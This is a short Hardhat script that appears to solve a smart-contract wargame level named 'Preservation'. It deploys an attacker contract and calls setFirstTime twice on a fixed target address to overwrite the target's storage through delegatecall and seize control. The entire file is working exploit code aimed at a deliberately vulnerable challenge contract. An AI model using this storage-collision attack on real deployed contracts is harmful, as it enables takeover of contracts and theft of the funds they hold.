import { ethers } from "hardhat";

async function main() {


  const PreservationAttackerFactory = await ethers.getContractFactory("PreservationAttacker");
  const PreservationAttacker = await PreservationAttackerFactory.deploy();

  await PreservationAttacker.deployed();

  console.log(
    `PreservationAttacker deployed to ${PreservationAttacker.address}`
  );

  const signers = await ethers.getSigners();
  const signer = signers[0];
  const player =  await signer.getAddress()
  console.log("Using signer with address:", player);

  const attackerAddr = ethers.BigNumber.from(PreservationAttacker.address);
  console.log(attackerAddr);

  const preservationAddr = "0x484fb29b336C26e2c95a4b51B23E55FEF4ca5F07"
  const preservation = await ethers.getContractAt("Preservation", preservationAddr, signer); 
  const gasLimit = 1_000_000;
  const tx = await preservation.setFirstTime(attackerAddr, {gasLimit});
  console.log("Transaction hash:", tx.hash);
  await tx.wait();
  const tx2 = await preservation.setFirstTime(1, {gasLimit});
  console.log("Transaction2 hash:", tx2.hash);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
